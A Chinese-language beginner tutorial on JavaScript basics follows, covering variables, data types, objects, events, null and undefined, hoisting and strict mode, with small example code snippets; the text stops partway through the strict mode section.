<h2 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h2><p>在 HTML 中，JavaScript 语句用于向浏览器发出命令。<br>语句是用分号分隔 <code>x=5+6;</code></p>
<h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><p>JavaScript 同样保留了一些关键字，这些关键字在当前的语言版本中并没有使用，但在以后 JavaScript 扩展中会用到。</p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>双斜杠 &#x2F;&#x2F; 后的内容将会被浏览器忽略</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 我不会执行</span><br></pre></td></tr></table></figure>

<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>JavaScript 有多种数据类型：数字，字符串，数组，对象等等。<br>JavaScript是弱类型编程语言,定义变量都使用 var 定义,与 Java 这种强类型语言有区别。<br>在定义后可以通过 <code>typeOf()</code> 来获取JavaScript中变量的数据类型<br>注意: typeof 不能用来判断是 Array 还是Object<br>使用 <code>isArray</code> 方法可以判断是否为数组<br>使用 <code>instanceof</code> 操作符也可以判断是否为数组</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>JavaScript 语句可以写在函数内，函数可以重复引用：<br>引用一个函数 &#x3D; 调用函数(执行函数内的语句)。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;                                <span class="comment">// 返回 a 乘以 b 的结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="字母大小写"><a href="#字母大小写" class="headerlink" title="字母大小写"></a>字母大小写</h2><p>JavaScript 对大小写是敏感的<br>函数 getElementById 与 getElementbyID 是不同的。<br>同样，变量 myVariable 与 MyVariable 也是不同的。</p>
<h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><p>JavaScript 使用 Unicode 字符集。<br>Unicode 覆盖了所有的字符，包含标点等字符。</p>
<h1 id="语句-1"><a href="#语句-1" class="headerlink" title="语句"></a>语句</h1><h2 id="分号"><a href="#分号" class="headerlink" title="分号"></a>分号</h2><p>在 JavaScript 中，用分号来结束语句是可选的。</p>
<h2 id="对代码行进行折行"><a href="#对代码行进行折行" class="headerlink" title="对代码行进行折行"></a>对代码行进行折行</h2><p>可以在文本字符串中使用反斜杠对代码行进行换行。例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;你好 \</span></span><br><span class="line"><span class="string">世界!&quot;</span>);</span><br></pre></td></tr></table></figure>


<h1 id="注释-1"><a href="#注释-1" class="headerlink" title="注释"></a>注释</h1><p>单行注释以 <code>//</code> 开头。<br>多行注释以 <code>/*</code> 开始，以 <code>*/</code> 结尾。</p>
<h1 id="变量-1"><a href="#变量-1" class="headerlink" title="变量"></a>变量</h1><p>可以把变量看做存储数据的容器。</p>
<h2 id="Javascript变量"><a href="#Javascript变量" class="headerlink" title="Javascript变量"></a>Javascript变量</h2><ul>
<li>变量必须以字母开头</li>
<li>变量也能以$和_符号开头（不推荐）</li>
<li>变量名称对大小写敏感（y 和 Y 是不同的变量）</li>
</ul>
<h2 id="一条语句，多个变量"><a href="#一条语句，多个变量" class="headerlink" title="一条语句，多个变量"></a>一条语句，多个变量</h2><p>可以在一条语句中声明很多变量。该语句以 var 开头，并使用逗号分隔变量即可：<br><code>var lastname=&quot;Doe&quot;, age=30, job=&quot;carpenter&quot;;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var lastname=&quot;Doe&quot;,</span><br><span class="line">age=30,</span><br><span class="line">job=&quot;carpenter&quot;;</span><br></pre></td></tr></table></figure>
<p>一条语句中声明的多个变量不可以同时赋同一个值:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var x,y,z=1;    x,y 为 undefined， z 为 1</span><br></pre></td></tr></table></figure>
<h2 id="Value-x3D-undefined"><a href="#Value-x3D-undefined" class="headerlink" title="Value &#x3D; undefined"></a>Value &#x3D; undefined</h2><p>在计算机程序中，经常会声明无值的变量。未使用值来声明的变量，其值实际上是 undefined。例如：<br><code>var carname;</code></p>
<h2 id="重新声明-JavaScript-变量"><a href="#重新声明-JavaScript-变量" class="headerlink" title="重新声明 JavaScript 变量"></a>重新声明 JavaScript 变量</h2><p>如果重新声明 JavaScript 变量，该变量的值不会丢失：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var carname=&quot;Volvo&quot;;</span><br><span class="line">var carname;     			值依然是&quot;Volvo&quot;</span><br></pre></td></tr></table></figure>

<h2 id="使用-let-和-const-ES6"><a href="#使用-let-和-const-ES6" class="headerlink" title="使用 let 和 const (ES6)"></a>使用 let 和 const (ES6)</h2><p>在 2015 后的 JavaScript 版本 (ES6) 允许我们使用 const 关键字来定义一个常量，使用 let 关键字定义的限定范围内作用域的变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let var1 [= value1] [, var2 [= value2]] [, ..., varN [= valueN]];</span><br></pre></td></tr></table></figure>
<p>let允许声明一个作用域被限制在块级中的变量、语句或者表达式。在Function中局部变量推荐使用let变量，避免变量名冲突。<br>作用域规则<br>let 声明的变量只在其声明的块或子块中可用，这一点，与var相似。二者之间最主要的区别在于var声明的变量的作用域是整个封闭函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">letTest</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> x = <span class="number">2</span>;       <span class="comment">// 不同的变量    </span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(x);  <span class="comment">// 2  </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x);  <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="数据类型-1"><a href="#数据类型-1" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="JavaScript-拥有动态类型"><a href="#JavaScript-拥有动态类型" class="headerlink" title="JavaScript 拥有动态类型"></a>JavaScript 拥有动态类型</h2><p>JavaScript 拥有动态类型。这意味着相同的变量可用作不同的类型：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x;               <span class="comment">// x 为 undefined</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">5</span>;           <span class="comment">// 现在 x 为数字</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="string">&quot;John&quot;</span>;      <span class="comment">// 现在 x 为字符串</span></span><br></pre></td></tr></table></figure>

<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>创建数组的四种方式：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);    <span class="comment">//这是一个预定义的数组，在创建时初始化</span></span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span> ];       <span class="comment">//同样是在创建时初始化，但是这种创建更为简洁直观</span></span><br><span class="line"><span class="keyword">var</span> arr3 = <span class="keyword">new</span> <span class="title class_">Array</span>( );   <span class="keyword">var</span> arr4 = [ ];     <span class="comment">//这两种是创建空的数组</span></span><br></pre></td></tr></table></figure>
<p>下面的代码创建名为 cars 的数组：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> cars=<span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">cars[<span class="number">0</span>]=<span class="string">&quot;Saab&quot;</span>;</span><br><span class="line">cars[<span class="number">1</span>]=<span class="string">&quot;Volvo&quot;</span>;</span><br><span class="line">cars[<span class="number">2</span>]=<span class="string">&quot;BMW&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>或者 (condensed array):</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> cars=<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>对象由花括号分隔。在括号内部，对象的属性以名称和值对的形式 (name : value) 来定义。属性由逗号分隔：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person=&#123;<span class="attr">firstname</span>:<span class="string">&quot;John&quot;</span>, <span class="attr">lastname</span>:<span class="string">&quot;Doe&quot;</span>, <span class="attr">id</span>:<span class="number">5566</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>上面例子中的对象 (person) 有三个属性：firstname、lastname 以及 id。<br>空格和折行无关紧要。声明可横跨多行。<br>对象属性有两种寻址方式：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">name=person.<span class="property">lastname</span>;</span><br><span class="line">name=person[<span class="string">&quot;lastname&quot;</span>];</span><br></pre></td></tr></table></figure>

<h2 id="Undefined-和-Null"><a href="#Undefined-和-Null" class="headerlink" title="Undefined 和 Null"></a>Undefined 和 Null</h2><p>Undefined 这个值表示变量不含有值。<br>可以通过将变量的值设置为 null 来清空变量。</p>
<h2 id="声明变量类型"><a href="#声明变量类型" class="headerlink" title="声明变量类型"></a>声明变量类型</h2><p>当声明新变量时，可以使用关键词 “new” 来声明其类型：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> carname=<span class="keyword">new</span> <span class="title class_">String</span>;</span><br><span class="line"><span class="keyword">var</span> x=      <span class="keyword">new</span> <span class="title class_">Number</span>;</span><br><span class="line"><span class="keyword">var</span> y=      <span class="keyword">new</span> <span class="title class_">Boolean</span>;</span><br><span class="line"><span class="keyword">var</span> cars=   <span class="keyword">new</span> <span class="title class_">Array</span>;</span><br><span class="line"><span class="keyword">var</span> person= <span class="keyword">new</span> <span class="title class_">Object</span>;</span><br></pre></td></tr></table></figure>
<p>注意：JavaScript 变量均为对象。当声明一个变量时，就创建了一个新的对象。</p>
<h1 id="对象-1"><a href="#对象-1" class="headerlink" title="对象"></a>对象</h1><p>JavaScript 对象是拥有属性和方法的数据。</p>
<h2 id="访问对象方法"><a href="#访问对象方法" class="headerlink" title="访问对象方法"></a>访问对象方法</h2><p>可以使用以下语法创建对象方法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">methodName : <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 代码 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用以下语法访问对象方法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objectName.<span class="title function_">methodName</span>()</span><br></pre></td></tr></table></figure>
<p>通常 methodName() 是作为对象的一个方法， methodName 是作为一个属性。如果使用 fullName 属性，不添加 (), 它会返回函数的定义。</p>
<h2 id="函数语法"><a href="#函数语法" class="headerlink" title="函数语法"></a>函数语法</h2><p>函数就是包裹在花括号中的代码块，前面使用了关键词 function：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">functionname</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 执行代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意：JavaScript 对大小写敏感。关键词 function 必须是小写的，并且必须以与函数名称相同的大小写来调用函数。</p>
<h2 id="局部-JavaScript-变量"><a href="#局部-JavaScript-变量" class="headerlink" title="局部 JavaScript 变量"></a>局部 JavaScript 变量</h2><p>在 JavaScript 函数内部声明的变量（使用 var）是局部变量，所以只能在函数内部访问它。（该变量的作用域是局部的）。<br>您可以在不同的函数中使用名称相同的局部变量，因为只有声明过该变量的函数才能识别出该变量。<br>只要函数运行完毕，本地变量就会被删除。</p>
<h2 id="全局-JavaScript-变量"><a href="#全局-JavaScript-变量" class="headerlink" title="全局 JavaScript 变量"></a>全局 JavaScript 变量</h2><p>在函数外声明的变量是全局变量，网页上的所有脚本和函数都能访问它。</p>
<h2 id="JavaScript-变量的生存期"><a href="#JavaScript-变量的生存期" class="headerlink" title="JavaScript 变量的生存期"></a>JavaScript 变量的生存期</h2><p>JavaScript 变量的生命期从它们被声明的时间开始。<br>局部变量会在函数运行以后被删除。<br>全局变量会在页面关闭后被删除。</p>
<h2 id="向未声明的-JavaScript-变量分配值"><a href="#向未声明的-JavaScript-变量分配值" class="headerlink" title="向未声明的 JavaScript 变量分配值"></a>向未声明的 JavaScript 变量分配值</h2><p>如果把值赋给尚未声明的变量，该变量将被自动作为 window 的一个属性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">carname=&quot;Volvo&quot;;</span><br></pre></td></tr></table></figure>
<p>将声明 window 的一个属性 carname。<br>非严格模式下给未声明变量赋值创建的全局变量，是全局对象的可配置属性，可以删除。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> var1 = <span class="number">1</span>; <span class="comment">// 不可配置全局属性</span></span><br><span class="line">var2 = <span class="number">2</span>; <span class="comment">// 没有使用 var 声明，可配置全局属性</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">var1</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">var1</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">var2</span>); <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> var1; <span class="comment">// false 无法删除</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(var1); <span class="comment">//1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> var2; </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">delete</span> var2); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(var2); <span class="comment">// 已经删除 报错变量未定义</span></span><br></pre></td></tr></table></figure>


<h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><p>HTML 事件是发生在 HTML 元素上的事情。<br>当在 HTML 页面中使用 JavaScript 时， JavaScript 可以触发这些事件。</p>
<h2 id="HTML-事件"><a href="#HTML-事件" class="headerlink" title="HTML 事件"></a>HTML 事件</h2><p>HTML 事件可以是浏览器行为，也可以是用户行为。<br>以下是 HTML 事件的实例：</p>
<ul>
<li>HTML 页面完成加载</li>
<li>HTML input 字段改变时</li>
<li>HTML 按钮被点击<br>在事件触发时 JavaScript 可以执行一些代码。<br>HTML 元素中可以添加事件属性，使用 JavaScript 代码来添加 HTML 元素。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;getElementById(&#x27;demo&#x27;).innerHTML=Date()&quot;</span>&gt;</span>现在的时间是?<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;this.innerHTML=Date()&quot;</span>&gt;</span>现在的时间是?<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;displayDate()&quot;</span>&gt;</span>现在的时间是?<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="常见的HTML事件"><a href="#常见的HTML事件" class="headerlink" title="常见的HTML事件"></a>常见的HTML事件</h2><p>onchange		HTML元素改变<br>onclick			用户点击HTML元素<br>onmouseover		鼠标指针移动到指定元素上时发生<br>onmouseout		用户从一个HTML元素上移开鼠标时发生<br>onkeydown		用户按下键盘按键<br>onload			浏览器已完成页面的加载</p>
<h2 id="Javascript可以做的事"><a href="#Javascript可以做的事" class="headerlink" title="Javascript可以做的事"></a>Javascript可以做的事</h2><p>事件可以用于处理表单验证，用户输入，用户行为及浏览器动作:</p>
<ul>
<li>页面加载时触发事件</li>
<li>页面关闭时触发事件</li>
<li>用户点击按钮执行动作</li>
<li>验证用户输入内容的合法性</li>
</ul>
<h2 id="可以使用多种方法来执行-JavaScript-事件代码："><a href="#可以使用多种方法来执行-JavaScript-事件代码：" class="headerlink" title="可以使用多种方法来执行 JavaScript 事件代码："></a>可以使用多种方法来执行 JavaScript 事件代码：</h2><ul>
<li>HTML 事件属性可以直接执行 JavaScript 代码</li>
<li>HTML 事件属性可以调用 JavaScript 函数</li>
<li>可以为 HTML 元素指定自己的事件处理程序</li>
<li>可以阻止事件的发生。</li>
</ul>
<h1 id="break-和-continue-语句"><a href="#break-和-continue-语句" class="headerlink" title="break 和 continue 语句"></a>break 和 continue 语句</h1><p>可以对 JavaScript 语句进行标记。如需标记 JavaScript 语句，请在语句之前加上冒号：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">label:</span><br><span class="line">statements</span><br></pre></td></tr></table></figure>
<p>break 和 continue 语句仅仅是能够跳出代码块的语句。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break labelname; </span><br><span class="line">continue labelname;</span><br></pre></td></tr></table></figure>
<p>continue 语句（带有或不带标签引用）只能用在循环中。<br>break 语句（不带标签引用），只能用在循环或 switch 中。<br>通过标签引用，break 语句可用于跳出任何 JavaScript 代码块：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cars=[<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Ford&quot;</span>];</span><br><span class="line"><span class="attr">list</span>: </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">0</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">1</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">2</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">    <span class="keyword">break</span> list;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">3</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">4</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">5</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">&#125;												<span class="comment">// break之后的代码不会执行</span></span><br></pre></td></tr></table></figure>


<h1 id="null-和-undefined"><a href="#null-和-undefined" class="headerlink" title="null 和 undefined"></a>null 和 undefined</h1><h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><p>在 JavaScript 中 null 表示 “什么都没有”。<br>null是一个只有一个值的特殊类型。表示一个空对象引用。<br>可以设置为 null 来清空对象<br>null主动释放一个变量引用的对象，表示一个变量不再指向任何对象地址。</p>
<h2 id="undefined"><a href="#undefined" class="headerlink" title="undefined"></a>undefined</h2><p>在 JavaScript 中, undefined 是一个没有设置值的变量。<br>typeof 一个没有值的变量会返回 undefined。<br>可以设置为 undefined 来清空对象<br>undefined是所有没有赋值变量的默认值，自动赋值。</p>
<h2 id="undefined-和-null-的区别"><a href="#undefined-和-null-的区别" class="headerlink" title="undefined 和 null 的区别"></a>undefined 和 null 的区别</h2><p>null 和 undefined 的值相等，但类型不等</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>             <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>                  <span class="comment">// object</span></span><br><span class="line"><span class="literal">null</span> === <span class="literal">undefined</span>           <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">undefined</span>            <span class="comment">// true</span></span><br></pre></td></tr></table></figure>


<h1 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h1><p>Number() 转换为数字， String() 转换为字符串， Boolean() 转换为布尔值。</p>
<h2 id="数据类型-2"><a href="#数据类型-2" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型：string . number . boolean . object . function . symbol<br>对象类型：Object . Date . Array<br>不包含任何值的数据类型：null . undefined<br>注意：<br>NaN 的数据类型是 number<br>数组(Array)的数据类型是 object<br>日期(Date)的数据类型为 object<br>null 的数据类型是 object<br>未定义变量的数据类型为 undefined<br>如果对象是 JavaScript Array 或 JavaScript Date ，我们就无法通过 typeof 来判断他们的类型，因为都是 返回 object。</p>
<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>constructor 属性返回所有 JavaScript 变量的构造函数。</p>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p><strong>search()</strong> 方法用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子串的起始位置。<br><strong>replace()</strong> 方法用于在字符串中用一些字符串替换另一些字符串，或替换一个与正则表达式匹配的子串。<br><strong>test()</strong> 方法是一个正则表达式方法。test() 方法用于检测一个字符串是否匹配某个模式，如果字符串中含有匹配的文本，则返回 true，否则返回 false。<br><strong>exec()</strong> 方法是一个正则表达式方法。exec() 方法用于检索字符串中的正则表达式的匹配。该函数返回一个数组，其中存放匹配的结果。如果未找到匹配，则返回值为 null。<br>使用 RegExp 对象<br>在 JavaScript 中，RegExp 对象是一个预定义了属性和方法的正则表达式对象。</p>
<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>浏览器点击F12，选择Sources,设置断点进行代码调试即可（要在js中才行）。<br>debugger 关键字用于停止执行 JavaScript，并调用调试函数。这个关键字与在调试工具中设置断点的效果是一样的。如果没有调试可用，debugger 语句将无法工作。</p>
<h1 id="声明提升-hoisting"><a href="#声明提升-hoisting" class="headerlink" title="声明提升(hoisting)"></a>声明提升(hoisting)</h1><p>JavaScript 中，函数及变量的声明都将被提升到函数的最顶部。<br>JavaScript 中，变量可以在使用后声明，也就是变量可以先使用再声明。</p>
<ul>
<li>JavaScript 初始化不会提升<br>JavaScript 只有声明的变量会提升，初始化的不会。<br>实例：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">5</span>; <span class="comment">// 初始化 x</span></span><br><span class="line">elem = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo&quot;</span>); <span class="comment">// 查找元素</span></span><br><span class="line">elem.<span class="property">innerHTML</span> = x + <span class="string">&quot; &quot;</span> + y;           <span class="comment">// 显示 x 和 y</span></span><br><span class="line"><span class="keyword">var</span> y = <span class="number">7</span>; <span class="comment">// 初始化 y</span></span><br></pre></td></tr></table></figure>
y 输出了 undefined，这是因为变量声明 (var y) 提升了，但是初始化(y &#x3D; 7) 并不会提升，所以 y 变量是一个未定义的变量。</li>
<li>在头部声明你的变量<br>通常我们在每个作用域开始前声明这些变量，这也是正常的 JavaScript 解析步骤，易于我们理解。</li>
</ul>
<h1 id="严格模式-use-strict"><a href="#严格模式-use-strict" class="headerlink" title="严格模式(use strict)"></a>严格模式(use strict)</h1><p>JavaScript 严格模式（strict mode）即在严格的条件下运行</p>
<h2 id="使用-“use-strict”-指令"><a href="#使用-“use-strict”-指令" class="headerlink" title="使用 “use strict” 指令"></a>使用 “use strict” 指令</h2><p>“use strict” 指令在 JavaScript 1.8.5 (ECMAScript5) 中新增。<br>它不是一条语句，但是是一个字面量表达式，在 JavaScript 旧版本中会被忽略。<br>“use strict” 的目的是指定代码在严格条件下执行。<br>严格模式下不能使用未声明的变量。</p>
<h2 id="严格模式声明"><a href="#严格模式声明" class="headerlink" title="严格模式声明"></a>严格模式声明</h2><p>严格模式通过在脚本或函数的头部添加 <code>use strict</code> ; 表达式来声明。<br>实例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="title function_">myFunction</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">    y = <span class="number">3.14</span>;   <span class="comment">// 报错 (y 未定义)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为什么使用严格模式:</p>
<ul>
<li>消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;</li>
<li>消除代码运行的一些不安全之处，保证代码运行的安全；</li>
<li>提高编译器效率，增加运行速度；</li>
<li>为未来新版本的Javascript做好铺垫。</li>
</ul>
<h2 id="严格模式的限制"><a href="#严格模式的限制" class="headerlink" title="严格模式的限制"></a>严格模式的限制</h2><ul>
<li><p>不允许使用未声明的变量</p>
</li>
<li><p>不允许删除变量或对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">x</span>(<span class="params">p1, p2</span>) &#123;&#125;;</span><br><span class="line"><span class="keyword">delete</span> x;  </span><br></pre></td></tr></table></figure></li>
<li><p>不允许变量重名</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">x</span>(<span class="params">p1, p1</span>) &#123;&#125;;</span><br></pre></td></tr></table></figure></li>
<li><p>不允许使用八进制</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> x = <span class="number">010</span>; </span><br></pre></td></tr></table></figure></li>
<li><p>不允许使用转义字符</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> x = \<span class="number">010</span>;</span><br></pre></td></tr></table></figure></li>
<li><p>不允许对只读属性赋值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">&quot;x&quot;</span>, &#123;<span class="attr">value</span>:<span class="number">0</span>, <span class="attr">writable</span>:<span class="literal">false</span>&#125;);</span><br><span class="line"></span><br><span class="line">obj.<span class="property">x</span> = <span class="number">3.14</span>;  </span><br></pre></td></tr></table></figure></li>
<li><p>不允许对一个使用getter方法读取的属性进行赋值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="keyword">get</span> <span class="title function_">x</span>() &#123;<span class="keyword">return</span> <span class="number">0</span>&#125; &#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="property">x</span> = <span class="number">3.14</span>;            <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>不允许删除一个不允许删除的属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li>
<li><p>变量名不能使用 “eval” 字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">eval</span> = <span class="number">3.14</span>;         <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li>
<li><p>变量名不能使用 “arguments” 字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable language_">arguments</span> = <span class="number">3.14</span>;    <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li>
<li><p>不允许使用以下这种语句</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">with</span> (<span class="title class_">Math</span>)&#123;x = <span class="title function_">cos</span>(<span class="number">2</span>)&#125;; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li>
<li><p>由于一些安全原因，在作用域 eval() 创建的变量不能被调用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="built_in">eval</span> (<span class="string">&quot;var x = 2&quot;</span>);</span><br><span class="line">alert (x);               <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li>
<li><p>禁止this关键字指向全局对象</p>
